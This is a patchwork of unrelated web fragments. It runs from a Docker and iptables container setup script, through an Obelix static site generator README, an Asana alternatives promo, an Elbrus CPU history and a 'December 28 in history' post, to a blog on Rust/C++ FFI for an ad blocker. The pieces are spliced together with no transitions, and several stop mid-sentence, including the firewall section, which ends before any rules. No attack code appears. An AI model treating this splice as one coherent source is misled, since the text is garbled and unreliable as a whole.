APP1_WORDPRESSIP="10.10.101.3"

# Create APP1 Docker Volumes
docker volume create app1-mysql
docker volume create app1-data

# Create APP1 MySQL Container
sudo docker run --net int-app1 --ip=$APP1_MYSQLIP --name app1-mysql \
--mount source=app1-mysql,target=/var/lib/mysql -v /tmp/scripts:/tmp/scripts \
-e MYSQL_ROOT_PASSWORD='&lt;passw0rd&gt;' \
--restart=always -d mysql:latest

# Create APP1 WordPress Container
sudo docker run --net int-app1 --ip=$APP1_WORDPRESSIP --name app1-wordpress \
--mount source=app1-data,target=/var/www/html/wp-content \
-e WORDPRESS_DB_HOST="app1-mysql" \
-e WORDPRESS_DB_PASSWORD="&lt;passw0rd&gt;" \
--restart=always -d wordpress

# APP2 NGINX Container IP Address
APP2_IP="192.168.100.2"

# Create APP2 Docker Volumes
docker volume create app2-conf
docker volume create app2-www

# Create APP2 NGINX Container
sudo docker run --net ext-app2 --ip=$APP2_IP --dns=8.8.8.8 --name app2-nginx -p 80:80 -p 443:443 \
--mount source=app2-conf,target=/etc/nginx/conf.d/ \
--mount source=app2-www,target=/var/www/ \
--restart always \
-d nginx

</pre>
<p>Firewall one-time configuration commands as below – <strong><em>**note requires replacing the docker network ID’s**</em></strong>:</p>
<pre># For rule persistence this requires "iptables-persistent netfilter-persistent"
# sudo apt-get install iptables-persistent netfilter-persistent

# Physical Networks
PROTECTED_LAN="10.10.10.0/24"

# Docker Host
PROTECTED_HOST="10.10.10.100"

# Docker Networks
APP1_SUBNET="10.10.101.0/24"
APP2_SUBNET="10.10.102.0/24"

# Physical Interfaces
LAN_INT="ens3"

# Docker Interfaces - obtain these IDs from the command: sudo docker network ls
APP1_INT="br-xxxxxxxx1"
APP2_INT="br-xxxxxxxx2"

# Container IPs
APP1_MYSQLIP="10.10.101.2"
APP1_IP="10.10.101.3"
APP2_IP="10.10.102.2"

# Physical Servers

        <img src="https://obelix-site-builder.github.io/obelix/images/obelix.jpg" alt="obelix the gaul">
      </p>
      <p>Obelix is a <a href="https://www.netlify.com/blog/2020/04/14/what-is-a-static-site-generator-and-3-ways-to-find-the-best-one/">static site generator</a>. Its primary goals are simplicity, ease of use, and extensibility.</p>
      <p>In a nutshell, a static site generator transforms a set of input data into static assets (HTML, CSS, JavaScript, images, etc.) ready to be served by a web server. The input data can come from a wide variety of sources, from local files on disk to APIs.</p>
      <p>Out of the box, Obelix supports:</p>
      <ul>
        <li><a href="https://commonmark.org/">CommonMark</a>-compliant markdown rendering</li>
        <li>Page and post metadata via <a href="https://rollout.io/blog/yaml-tutorial-everything-you-need-get-started/">YAML</a> frontmatter</li>
        <li>String templating powered by <a href="https://handlebarsjs.com/">Handlebars</a></li>
        <li>Layout templates to apply a common layout to the whole site or a subdirectory</li>
        <li>List templates to render index pages, feeds, or any other listing of a subdirectory</li>
        <li>A powerful plugin system that allows developers to write JavaScript to pull in data from external APIs, transform existing data before it gets rendered, or anything else you can imagine</li>
      </ul>
      <h2>Installation</h2>
      <p>Obelix is available <a href="https://npmjs.org/obelix">on NPM</a>. It's meant to be installed globally:</p>
      <pre><code>$ sudo npm install -g obelix
</code></pre>
      <h2>Getting started</h2>
      <p>An Obelix site consists of a directory containing the source files for the website and an <code>obelix.json</code> configuration file. At a minimum, this file needs to contain two keys, <code>"src"</code> and <code>"out"</code>:</p>
      <pre><code>{
    "src": "source",
    "out": "build"
}
</code></pre>
      <p>The <code>"src"</code> key should be the relative path to the directory where your site's source files live. The <code>"out"</code> key is the relative path to the directory where Obelix will output the built site. For example, the directory for the site described by the <code>obelix.json</code> above might look like this:</p>
      <pre><code>.
├── obelix.json
└── source
    ├── index.md
    └── # all site source files here
</code></pre>
      <p>To build the site, run:</p>
      <pre><code>$ obelix build
</code></pre>
      <p>This will parse through all file in the source directory, transform them as necessary, and render the final site to the output directory (creating it if necessary). Any markdown files will get transformed to HTML, frontmatter and Handlebars template expressions will be processed, and layout and list templates will be applied.</p>
      <p>You can also run:</p>
      <pre><code>$ obelix serve
</code></pre>
      <p>This will start a web server serving your site on port 8080 (by default - pass the <code>-p</code> option to change this). The server will automatically rebuild the site whenever it detects changes to a source file. This is a just a development convenience - the <code>obelix serve</code> server is not production-ready!</p>
      <p>There are a few other keys you can put in <code>obelix.json</code>:</p>
      <ul>
        <li><code>"metadata"</code>: this should be a JSON object containing site metadata. This object will exposed in Handlebars templates as the <code>site</code> key (see below)</li>
        <li><code>"plugins"</code>: An object mapping plugin names to configuration options. More details on this in the Plugins section below</li>
      </ul>
      <h2>Source file configuration</h2>
      <p>All source files in an Obelix site are considered either an <code>asset</code> or a <code>page</code>. A <code>page</code> is a text file (with any file extension) where the beginning of the file contains <a href="https://rollout.io/blog/yaml-tutorial-everything-you-need-get-started/">YAML</a> frontmatter. YAML frontmatter is used to specify metadata about the page and consists of the characters <code>---</code>, followed by a newline and a YAML document containing data you want, and finally another newline and the closing characters <code>---</code>. For example:</p>
      <pre><code>---
author: Getafix
title: Little-known herbs of Gaul
published: 2020-12-17
tags:
  - blog
  - druidism
---
And then the page content goes here!
</code></pre>
      <p>Obelix performs some default transformations on <code>page</code>-type sources, including expanding Handlebars template expressions and applying layout templates, and exposes these files as data in list templates (more on all this later).</p>
      <p>Any file that does not contain YAML frontmatter, including image or other non-text files, are considered <code>asset</code>-type sources. Obelix does no additional processing on <code>asset</code> files - it just copies them verbatim to the output directory.</p>
      <p><strong>Important</strong>: Even if you have no metadata you want to attach to a page, you need to put YAML frontmatter on it for Obelix to process it. In these cases, you can just put the opening <code>---</code> and closing <code>---</code> with no content in between.</p>
      <p>The source directory structure determines the output directory structure. For example, a source file <code>blob/post1.md</code> would get written to the output directory as <code>blog/post1.html</code>.</p>
      <h2>Template expansion</h2>
      <p><code>Page</code>-type source files can contain <a href="https://handlebarsjs.com/">Handlebars</a> template expressions. Template expressions are delimited by double curly braces - for example, <code>{{ title }}</code>. Any page metadata in the page's frontmatter is available as a variable for use in a template expression, and any site metadata set in <code>obelix.json</code> is available in the <code>site</code> object in template expressions.</p>
      <p>For example, given the following <code>obelix.json</code>:</p>
      <pre><code>{
    "src": "source",
    "out": "build",
    "metadata": {
        "publisher": "When In Rome LLC"
    }
}
</code></pre>
      <p>And the following <code>page</code> source <code>post.md</code>:</p>
      <pre><code>---
author: Caesar
---
This post was written by {{ author }} and published by {{ site.publisher }}
</code></pre>
      <p>The output file <code>post.html</code> would render like this:</p>
      <pre><code>&lt;html&gt;
  &lt;body&gt;
    &lt;p&gt;This post was written by Caesar and published by When In Rome LLC&lt;/p&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>Handlebars offers many additional templating features - see <a href="https://handlebarsjs.com/guide/">the official guide</a> to learn more.</p>
      <h2>Layout templates</h2>
      <p>Layout templates allow you to apply a unified layout to <code>page</code> sources. By default, layout templates are any file named <code>layout.html.hbs</code> or <code>layout.html.handlebars</code>, but these defaults can be overridden by the <code>"layoutTemplates"</code> <code>obelix.json</code> field, which should be an array of layout template names. Individual pages can also specify a <code>template</code> metadata field, which should be the name of the file to use as a layout template for that page. Layout templates apply to all <code>page</code> sources in the same directory they are in and in subdirectories, but if a subdirectory has its own layout template that template overrides the parent layout template. This means you can put a <code>layout.html.hbs</code> at the root of your site that will be applied by default to every <code>page</code> in the site, but you can override that template for individual subdirectories by giving them their own <code>layout.html.hbs</code>.</p>
      <p>A layout template is a Handlebars template that gets passed the content of the page it is applied to as the <code>content</code> key. When rendering a <code>page</code>, if Obelix finds a layout template for that page it will render the layout template and replace the output content with the result.</p>
      <p>An example should make things clearer. Given this <code>page</code> source <code>post.md</code>:</p>
      <pre><code>---
---
# My Post
This is some hot content!
</code></pre>
      <p>And this <code>layout.html.hbs</code>:</p>
      <pre><code>&lt;html&gt;
  &lt;head&gt;
     &lt;link rel="stylesheet" href="styles.css" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class="container"&gt;
       {{{ content }}}
    &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>The output file <code>post.html</code> would look like this:</p>
      <pre><code>&lt;html&gt;
  &lt;head&gt;
     &lt;link rel="stylesheet" href="styles.css" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class="container"&gt;
      &lt;h1&gt;My Post&lt;/h1&gt;
      &lt;p&gt;This is some hot content!&lt;/p&gt;
    &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>Note the use of triple curly braces in <code>{{{ content }}}</code>. This tells Handlebars not to HTML-escape the result of the expression. See <a href="https://handlebarsjs.com/guide/#html-escaping">here</a> for more info.</p>
      <h2>List templates</h2>
      <p>A list template is like a layout template, but instead of being passed a single page it gets passed a list of pages. List templates can be used to generate index pages, RSS feeds, or any other collection of content. A list template is simply any file with a <code>.hbs</code> or <code>.handlebars</code> file extension that isn't a layout template. Unless you have the <code>"layoutTemplates"</code> configuration option set, this means that any <code>.hbs</code> or <code>.handlebars</code> file that isn't named <code>layout.html.hbs</code>, <code>layout.html.handlebars</code>, or is the target of a <code>template</code> page metadata will be treated as a list template.</p>
      <p>List templates get passed an array of all pages in the same directory as them as the <code>pages</code> variable. Each item in this list is a <code>page</code> object that the one that gets passed to layout templates - it will have a <code>content</code> key containing the page content in addition to any keys in the page frontmatter. The <code>pages</code> array can be iterated over using the <a href="https://handlebarsjs.com/guide/builtin-helpers.html#each">Handlebars <code>each</code> helper</a>:</p>
      <pre><code>&lt;html&gt;
    &lt;body&gt;
      {{#each pages}}
          &lt;h1&gt;{{ title }}&lt;/h1&gt;
          
      {{/each}}
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>If you want to iterate over pages that aren't in the same directory as the list template, you can use the <code>site.pages</code> variable. This variable is a nested array of all pages in the site. The format of <code>site.pages</code> is a little weird: it's a recursive array that can be iterated over to access the pages in the top-level directories, but exposes subdirectories as attributes on that array with values that are themselves recursive arrays. For example, given the following site structure:</p>
      <pre><code>.
├── index.md
├── about.md
└── blog
    ├── post1.md
    └── post2.md
</code></pre>
      <p>The <code>site.pages</code> variable would be an array containing <code>index.md</code> and <code>about.md</code>, and <code>site.pages.blog</code> would be an array containing <code>post1.md</code> and <code>post2.md</code>.</p>
      <p>If you have a directory whose name isn't a valid JavaScript identifier, you can access it using index notation, e.g. <code>site.pages["My weird folder"]</code>. Although this layout is a bit unconventional, it makes it convenient to loop through pages using the <code>{{each}}</code> helper at any level in the directory structure.</p>
      <p>List templates can be either <code>page</code> or <code>asset</code> sources. If you include a frontmatter block in a list template, it will be treated as a <code>page</code> and have layout templates applied to it. If not, it will be treated as an <code>asset</code> and layout templates will not be applied to it.</p>
      <p>Tip: Obelix adds a <code>url</code> metadata field to every page by default. This is especially useful in list templates as it lets you construct a link to the pages that the list template is rendering.</p>
      <h2>Data files</h2>
      <p>Source files with a <code>.json</code>, <code>.yaml</code>, or <code>.yml</code> extension are considered data files. Data files are a way to store structured data that isn't meant to be displayed literally. Obelix parses all the data files it finds and passes …</p></div></div>

                    <p>I remember the first time I tried Asana in 2014. It was a simple project management tool, easy to use, and had fancy unicorns flying all over.</p><p>Since then, Asana has added several features and capabilities. It's made Asana a popular project management software with several thousand teams quickly adopting it. However, there are some reasons why you might want to look for an Asana alternative.</p><p>Before we jump in and look at the <a href="#alternatives-to-asana">top alternatives to Asana</a>, let’s look at its limitations.</p><hr><h2 id="5-reasons-why-you-should-look-for-an-asana-alternative">5 reasons why you should look for an Asana alternative</h2><h3 id="1-lack-of-hierarchical-view">1. Lack of Hierarchical View</h3><p>Asana has subtasks, but you can’t view them in a hierarchical order. This makes it extremely difficult if you want to view all the tasks and subtasks in one single view.</p><h3 id="2-unfriendly-pricing">2. Unfriendly Pricing</h3><p>Sure, you can use Asana for free. However, the free Asana version has heavy limitations in terms of its capabilities. And when you choose to upgrade to use some of the premium capabilities, you’re likely to burn a hole in your pocket with their steep pricing plans. For example, to set up <a href="https://zepel.io/guide/working-with-teams/dependencies/">dependencies between task items</a>, you’ll have to upgrade to their premium plan!</p><p>Asana’s premium version starts at $13.49 per user per month and goes all the way up to $30.49 per user per month. </p><p><em>Ouch!</em></p><h3 id="3-lack-of-developer-friendly-capabilities">3. Lack of Developer-Friendly Capabilities</h3><p>If you’ve got developers using Asana, then you’ve probably heard them being unhappy with the tool. After all, Asana doesn’t support <a href="https://zepel.io/guide/working-with-teams/description/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=asana-alternatives">markdown</a> and lacks deep <a href="https://zepel.io/integrations/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=asana-alternatives">integrations</a> with GitHub, Bitbucket, or GitLab.</p><h3 id="4-missing-agile-capabilities">4. Missing Agile Capabilities</h3><p>While Asana’s board view is great, it still lacks some key agile capabilities if you want to use it as an <a href="https://zepel.io/agile-tools/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=asana-alternatives">agile project management software</a>. For example, it lacks a dedicated sprint view that scrum teams can use. This makes Sprint planning, getting an estimation of how your sprint is progressing very hard.</p><h3 id="5-no-functional-reports">5. No Functional Reports</h3><p>Of course, when you’re building software products you’re likely following some form of agile methodology. If you’re one such team, you’ll notice that Asana doesn’t provide reporting capabilities such as burndown charts, burnup charts, cumulative flow diagrams, and more.</p><hr><!--kg-card-begin: html--><h2 id="alternatives-to-asana">11 Alternatives to Asana for Project Management</h2><!--kg-card-end: html--><h3 id="1-zepel">1. <a href="https://zepel.io/compare/asana-alternative/?utm_source=zepelblog&amp;utm_medium=heading&amp;utm_campaign=asana-alternatives">Zepel</a></h3><p>Zepel is the project management tool built for software product teams.

<h2>ELBRUS MCST History</h2>



<div><p>Before we look at the IcepeakITX ELBRUS-8CB motherboard lets first look at the history of Elbrus. </p><p>Elbrus CPU’s have been around for a very long time although unless you’re from Russia you’ve likely never heard of them. </p><p>They were first released in the early 1970’s and used in the Soviet space program, nuclear weapons research and defence systems as well as for research. </p></div>



<h3>Elbrus Timeline</h3>



<ul id="block-082e432c-8cfa-49d3-a848-51fd5247f666"><li><em>Elbrus 1</em>&nbsp;(1973) was the first in the line.<ul><li>A side development was an update of the 1965&nbsp;BESM-6&nbsp;as Elbrus-1K2.</li></ul></li><li><em>Elbrus 2</em>&nbsp;(1977) was a 10-processor computer, considered the first Soviet&nbsp;supercomputer, with superscalar&nbsp;RISC&nbsp;processors. Re-implementation of the Elbrus 1 architecture with faster&nbsp;ECL&nbsp;chips.</li><li><em>Elbrus 3</em>&nbsp;(1986) was a 16-processor computer developed by the Babayan’s team, and one of the first VLIW computers in the world.</li><li><em>Elbrus 2000</em>&nbsp;(2001) was a microprocessor development of the&nbsp;<em>Elbrus 3</em>&nbsp;architecture. Also known as&nbsp;<em>Elbrus-S</em>.<ul><li><em>Elbrus-3M1</em>&nbsp;(2005) is a two-processor computer based on&nbsp;Elbrus 2000&nbsp;microprocessor working at 300&nbsp;MHz.</li><li><em>Elbrus МВ3S1/C</em>&nbsp;(2009) is a&nbsp;ccNUMA&nbsp;four-processor computer based on&nbsp;Elbrus-S&nbsp;microprocessor working at 500&nbsp;MHz.</li></ul></li><li><em>Elbrus-2S+</em>&nbsp;(2011) working at 500&nbsp;MHz, with capacity to calculate 16&nbsp;GFlops.</li><li><em>Elbrus-2SM</em>&nbsp;(2014) working at 300&nbsp;MHz, with capacity to calculate 9.6&nbsp;GFlops.</li><li><em>Elbrus-4S</em>&nbsp;(2014) working at 800&nbsp;MHz, with capacity to calculate 50&nbsp;GFlops.<sup>[1]</sup></li><li><em>Elbrus-1S+</em>&nbsp;(2016) SoC with GPU, working at 600–1000&nbsp;MHz, with capacity to calculate 24&nbsp;GFlops.</li><li><em>Elbrus-8S</em>&nbsp;(2014–2015) working at 1300&nbsp;MHz, with capacity to calculate 250&nbsp;GFlops.</li><li><em>Elbrus-8SV</em>&nbsp;(2018) working at 1500&nbsp;MHz, with capacity to calculate 576&nbsp;GFlops.</li><li><em>Elbrus-16S</em>&nbsp;(2019) working at 2000&nbsp;MHz, with capacity to calculate 1.5&nbsp;TFlops.</li></ul>



<p>Over the years Elbrus have used several different architectures including: SPARC, x86 and Elbrus 2000.<br>Back in 2014 ELBRUS released the Elbrus-4C CPU which was designed for home and office use within Russia. Performance wasn’t great and as it couldn’t fully support x86. Computers using the Elbrus-4C CPU shipped with a custom proprietary Linux distro named Elbrus OS. Little is known about the success of this platform and they are never seen in the western world. I tried to buy an Elbrus-4C computer and have it shipped from Russia to the UK back in 2015 and it proved impossible. <br></p>

<p>Here are some events that happened on December 28th. It could be an event or a person that died or was born on that day</p><p><b>1846 – Iowa is admitted as the 29th U.S. state.</b></p><p>Iowa is a state in the Midwestern United States, bordered by the Mississippi River to the east and the Missouri River and Big Sioux River to the west. It is bordered by six states: Wisconsin to the northeast, Illinois to the east and southeast, Missouri to the south, Nebraska to the west, South Dakota to the northwest, and Minnesota to the north.</p><p>In colonial times, Iowa was a part of French Louisiana and Spanish Louisiana; its state flag is patterned after the flag of France. After the Louisiana Purchase, people laid the foundation for an agriculture-based economy in the heart of the Corn Belt.</p><p>In the latter half of the 20th century, Iowa's agricultural economy made the transition to a diversified economy of advanced manufacturing, processing, financial services, information technology, biotechnology, and green energy production. Iowa is the 26th most extensive in land area and the 30th most populous of the 50 U.S. states. The state's capital, most populous city, and largest metropolitan area fully located within the state is Des Moines. A portion of the larger Omaha, Nebraska, metropolitan area extends into three counties of southwest Iowa. Iowa has been listed as one of the safest U.S. states to live in.</p><p>On December 28, 1846, Iowa became the 29th state in the Union when President James K. Polk signed Iowa's admission bill into law. Once admitted to the Union, the state's boundary issues resolved, and most of its land purchased from Natives, Iowa set its direction to development and organized campaigns for settlers and investors, boasting the young frontier state's rich farmlands, fine citizens, free and open society, and good government.</p><p>US stamp commemorating Iowa statehood</p><p><a href="https://1.bp.blogspot.com/-mnk1aL4rQKo/X6xBTqx_oAI/AAAAAAAAM1g/Wn5c18Khlq4Ej_OHW4lya5PYAgSg-Ri0ACLcBGAsYHQ/s1597/US%2BStamp%2BIowa%2BStatehood%2B3c.jpg" imageanchor="1"><img alt="US Stamp Iowa Statehood 3c" data-original-height="1060" data-original-width="1597" height="212" src="https://1.bp.blogspot.com/-mnk1aL4rQKo/X6xBTqx_oAI/AAAAAAAAM1g/Wn5c18Khlq4Ej_OHW4lya5PYAgSg-Ri0ACLcBGAsYHQ/w320-h212/US%2BStamp%2BIowa%2BStatehood%2B3c.jpg" title="US Stamp Iowa Statehood 3c" width="320"></a></p><p><a href="https://1.bp.blogspot.com/-fSRIXvUe82Y/X6xB0VvcyXI/AAAAAAAAM1o/lW4ITi2D69sgoZoFyGrK0ilC1tAPsSmLACLcBGAsYHQ/s1502/US%2BFDC%2B1946%2BIowa%2BCity%2BIA%2BIowa%2BStatehood%2BCentennial.jpg" imageanchor="1"><img alt="US FDC 1946 Iowa City IA Iowa Statehood Centennial" data-original-height="869" data-original-width="1502" height="370" src="https://1.bp.blogspot.com/-fSRIXvUe82Y/X6xB0VvcyXI/AAAAAAAAM1o/lW4ITi2D69sgoZoFyGrK0ilC1tAPsSmLACLcBGAsYHQ/w640-h370/US%2BFDC%2B1946%2BIowa%2BCity%2BIA%2BIowa%2BStatehood%2BCentennial.jpg" title="US FDC 1946 Iowa City IA Iowa Statehood Centennial" width="640"></a></p><p><b>1856 Born: Woodrow Wilson, American historian and politician, 28th President of the United States, Nobel Prize laureate (d. 1924)</b></p><div><p>Thomas Woodrow Wilson (December 28, 1856 – February 3, 1924) was an American statesman, lawyer, and academic who served as the 28th president of the United States from 1913 to 1921. A member of the Democratic Party, Wilson served as the president of Princeton University and as the 34th governor of New Jersey before winning the 1912 presidential election. As president, he oversaw the passage of progressive legislative policies unparalleled until the New Deal in 1933. He also led the United States into World War I in 1917, establishing an activist foreign policy known as "Wilsonianism." He was the leading architect of the League of Nations.</p><p>Born in Staunton, Virginia, Wilson spent his early years in Augusta, Georgia, and Columbia, South Carolina. After earning a Ph.D. in political science from Johns Hopkins University, Wilson taught at various schools before becoming the president of Princeton. As governor of New Jersey from 1911 to 1913, Wilson broke with party bosses and won the passage of several progressive reforms. His success in New Jersey gave him a national reputation as a progressive reformer, and he won the presidential nomination at the 1912 Democratic National Convention. Wilson defeated incumbent Republican President William Howard Taft and Progressive Party nominee Theodore Roosevelt to win the 1912 presidential election, becoming the first Southerner to be elected president since the American Civil War.</p><p>During his first term, Wilson presided over the passage of his progressive New Freedom domestic agenda. His first major priority was the passage of the Revenue Act of 1913, which lowered tariffs and implemented a federal income tax. Later tax acts implemented a federal estate tax and raised the top income tax rate to 77 percent. Wilson also presided over the passage of the Federal Reserve Act, which created a central banking system in the form of the Federal Reserve System. Two major laws, the Federal Trade Commission Act and the Clayton Antitrust Act, were passed to regulate and break up large business interests known as trusts. To the disappointment of his African-American supporters, Wilson allowed some of his Cabinet members to segregate their departments. Upon the outbreak of World War I in 1914, Wilson maintained a policy of neutrality between the Allied Powers and the Central Powers. He won re-election by a narrow margin in the presidential election of 1916, defeating Republican nominee Charles Evans Hughes.</p><p>In early 1917, Wilson asked Congress for a declaration of war against Germany after Germany implemented a policy of unrestricted submarine warfare, and Congress complied. Wilson presided over war-time mobilization but devoted much of his efforts to foreign affairs, developing the Fourteen Points as a basis for post-war peace. After Germany signed an armistice in November 1918, Wilson and other Allied leaders took part in the Paris Peace Conference, where Wilson advocated for the establishment of a multilateral organization, per his "fourteenth point". The resulting League of Nations was incorporated into the Treaty of Versailles and other treaties with the defeated Central Powers, but Wilson was subsequently unable to convince the Senate to ratify that treaty or allow the United States to join the League. Wilson suffered a severe stroke in October 1919 and was incapacitated for the remainder of his presidency. He retired from public office in 1921 and died in 1924. Scholars have generally ranked Wilson as one of the better U.S. presidents, though he has received strong criticism for his actions regarding racial segregation.</p><p>US stamps depicting Woodrow Wilson</p></div><p><a href="https://1.bp.blogspot.com/-ZCx7sy0G7CM/XcF4lcfGUyI/AAAAAAAAJG4/DgRqXQizU507dHAZT4LnhSzWAC5KjnkkwCLcBGAsYHQ/s1600/Woodrow%2BWilson%2B-%2BLiberty%2BSeries.jpg"><img alt="Woodrow Wilson - Liberty Series" data-original-height="409" data-original-width="370" height="320" src="https://1.bp.blogspot.com/-ZCx7sy0G7CM/XcF4lcfGUyI/AAAAAAAAJG4/DgRqXQizU507dHAZT4LnhSzWAC5KjnkkwCLcBGAsYHQ/s320/Woodrow%2BWilson%2B-%2BLiberty%2BSeries.jpg" title="Woodrow Wilson - Liberty Series" width="289"></a></p><p><a href="https://1.bp.blogspot.com/-E9xCQDc50l0/XcF4wCH8DzI/AAAAAAAAJG8/RD-DAy0NlSwLDDhVPe4Oyc8P7doJFS16wCLcBGAsYHQ/s1600/s-l1600.jpg"><img alt="Woodrow Wilson Blk of 4" data-original-height="1311" data-original-width="1600" height="523" src="https://1.bp.blogspot.com/-E9xCQDc50l0/XcF4wCH8DzI/AAAAAAAAJG8/RD-DAy0NlSwLDDhVPe4Oyc8P7doJFS16wCLcBGAsYHQ/s640/s-l1600.jpg" title="Woodrow Wilson Blk of 4" width="640"></a></p><p><a href="https://1.bp.blogspot.com/-j2962wRP23Q/XcF49-YUNGI/AAAAAAAAJHE/HROMdbAJilAVUnK0h0kfDstK6ivk9llSgCLcBGAsYHQ/s1600/1938%2B%25241%2BWoodrow%2BWilson%252C%2B28th%2BPresident.jpg"><img alt="1938 $1 Woodrow Wilson, 28th President" data-original-height="500" data-original-width="446" height="320" src="https://1.bp.blogspot.com/-j2962wRP23Q/XcF49-YUNGI/AAAAAAAAJHE/HROMdbAJilAVUnK0h0kfDstK6ivk9llSgCLcBGAsYHQ/s320/1938%2B%25241%2BWoodrow%2BWilson%252C%2B28th%2BPresident.jpg" title="1938 $1 Woodrow Wilson, 28th President" width="285"></a></p><p><b>1888 Born: F. W. Murnau, German-American director, producer, and screenwriter (d. 1931)</b></p><p>Friedrich Wilhelm Murnau (born Friedrich Wilhelm Plumpe; December 28, 1888 – March 11, 1931) was a German film director.</p><p>He was greatly influenced by Schopenhauer, Nietzsche, Shakespeare and Ibsen plays he had seen at the age of 12, and became a friend of director Max Reinhardt. During World War I he served in the Imperial German Army, initially as an infantry company commander on the Eastern Front. Murnau later transferred to the German Army's Flying Corps, as an observer/gunner, and survived several crashes without any severe injuries.</p><p>One of Murnau's acclaimed works is the film Nosferatu (1922), an adaptation of Bram Stoker's Dracula. Although not a commercial success, owing to copyright issues with Stoker's estate, the film is considered a masterpiece of German Expressionist cinema. He later directed the film The Last Laugh (1924), as well as a 1926 interpretation of Goethe's Faust. He emigrated to Hollywood in 1926, where he joined the Fox Studio and made three films: Sunrise (1927), 4 Devils (1928) and City Girl (1930). Sunrise has been regarded by critics and film directors as among the best films ever made.</p><p>Murnau travelled to Bora Bora to make the film Tabu (1931) with documentary film pioneer Robert J. Flaherty. Flaherty left after artistic disputes with Murnau, who had to finish the movie on his own.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p>While trying to implement a long planned feature, an ad block in Angelfish, the Plasma Mobile webbrowser,
I was looking for a mostly complete and performant library that provides this functionality.</p>

<p>First I found libadblockplus, which is a C++ library providing the AdblockPlus core functionality.
Sounds great, right? Well, not quite. It includes it’s own v8 java script engine,
and since we are talking about a webbrowser with a QML interface here,
including a third java script engine and a second copy of v8 was absolutely not an option.
Even if this wasn’t a webbrowser,
running a java script engine as implementation detail of a library is at least … problematic.</p>

<p>The other option I found is <a href="https://github.com/brave/adblock-rust">adblock-rust</a>,
which is the built-in ad block of the Brave browser. As the name tells, it is written in Rust,
and I was originally looking for a C++ library. But it turned out this was not much of a problem,
since Rust features excellent C interoperability, just like C++.
Based on this common ground, bindings can be created to use Rust code from C++ (and the other way around if needed).</p>

<h2 id="approach-1">Approach 1</h2>
<p>My first approach was to use raw ffi. That means essentially building a C API featuring the typical C primitive types in rust,
and telling the rust compiler to represent structs in memory the same way that C would do.
Thanks to cbindgen, which automatically generates a header file with the information for the C compiler to know which fields a struct has and were they are,
we directly get something we can include in our C++ project.</p>

<p>The rust build system cargo is capable of running custom code at build time, and we can use that to run cbindgen on our rust code, by adding a file named <code>build.rs</code>:</p>
<pre><code>extern crate cbindgen;

use std::env;

fn main() {
    let crate_dir = env::var("CARGO_MANIFEST_DIR").unwrap();

    cbindgen::generate(&amp;crate_dir)
        .unwrap()
        .write_to_file("bindings.h");
}
</code></pre>

<p>Our core data structure for the ad block looks like this:</p>
<pre><code>#[repr(C)]
pub struct Adblock {
    blocker: *mut Engine,
}
</code></pre>
<p>It stores a pointer to the rust Engine type in a C compatible struct.
The struct can not be created directly from C / C++, since we don’t know anything about the Engine type there.</p>

<p>So we need a function on the rust side that creates and initializes the Engine for us and packs it into an <code>Adblock</code> struct.
Since the code in angelfish is doing a bit more than only that, the function takes two C string arguments, and returns a pointer to a mutable (non-const) Adblock object.</p>
<pre><code>#[no_mangle]
pub extern "C" fn new_adblock(
    list_dir: *const c_char,
    public_domain_suffix_file: *const c_char,
) -&gt; *mut Adblock
</code></pre>
<p>A few more thigs in this function signature are unusual, but they are all related to the FFI / C compatibility we need here:</p>
<ul>
  <li><code>#[no_mangle]</code> tells the rust compiler not to apply its rust specific function name mangling</li>
  <li><code>extern "C"</code> tells that this function should use the C calling conventions.</li>
</ul>

<p>Every time we interact with data from C, the rust compiler is unable to run its usual safety checks.
For that reason we need unsafe blocks around those lines of code.
If anything unexpectedly segfaults, it’s likely to be in our unsafe blocks.
To get a string that we can feed into a usual rust API, we can use <code>unsafe { CStr::from_ptr(public_domain_suffix_file).to_str() }</code>.</p>

<p>For more examples of how to interact with the C / C++ side, feel free to have a look at <a href="https://invent.kde.org/plasma-mobile/plasma-angelfish/-/blob/20e166c0fe2e38be63824b957c02fa58865ac67c/src/rs/adblock/src/adblock.rs">some real code in Angelfish</a>.
I’m by no means an expert on this, but it should help you get started.</p>

<p>Using this approach, the ad block could successfully be implemented in about 140 lines of rust code, of which only half is FFI code, and the rest actual logic.</p>

<h2 id="approach-2">Approach 2</h2>
<p>The second approach is to use the cxx crate (library), which can generate most of the boilerplate FFI code automatically, and provides a modern API on the C++ side.
To do that, it implements its own wrapper types, each wrapping the functionality of one type of one of the languages. Those wrapper types are implemented in both languages, and allow easily passing more advanced types than pointers and number types through the FFI boundary.
On the rust side, the wrapper types are not really visible, because a macro generates everything for us.</p>

<p>The only unusual thing on the rust side will be a small ffi module, declaring which types and functions we want to expose to C++:</p>
<pre><code>#[cxx::bridge]
mod ffi {
    extern "Rust" {
        type Adblock;
        type AdblockResult;

        fn new_adblock(list_dir: &amp;str, suffix_file: &amp;str) -&gt; Box&lt;Adblock&gt;;
        fn should_block(
            self: &amp;Adblock,
            url: &amp;str,
            source_url: &amp;str,
            request_type: &amp;str,
        ) -&gt; Box&lt;AdblockResult&gt;;
    }
}
</code></pre>

<p>All objects are returned as smart pointers, like <code>Box</code>.
On the C++ side, this will result in a <code>rust::Box&lt;Adblock&gt;</code>, which is a type generated by the cxx_build crate, which is doing something slightly similar to cbindgen.</p>

<p>With the cxx crate, our build.rs will look like this:</p>
<pre><code>extern crate cxx_build;

fn main() {
    cxx_build::bridge("src/adblock.rs").compile("angelfish-adblock")
}
</code></pre>

<p>You may wonder, if the cxx crate makes everything so easy, why did I start with approach 1 at all?
I had had a look at the cxx crate a few month ago, when it was still too minimal to do what I needed. Luckily I had another look, since it has become really useful in the meantime.
However learning the raw ffi way was important to understand what actually happens in the background, and I’d almost recommend everyone to have a look at that first before using the cxx crate. Using <code>cargo expand</code> you can then understand what cxx generated for you.</p>

<p>Given the cxx crate makes this so much easier, I initially feared it might add tons of new dependencies and increase the build time, but to my surprise it actually has a lot less dependencies than cbindgen. Even though cbindgen only uses those at build time (they don’t end up in the binary), they take some time to build.</p>

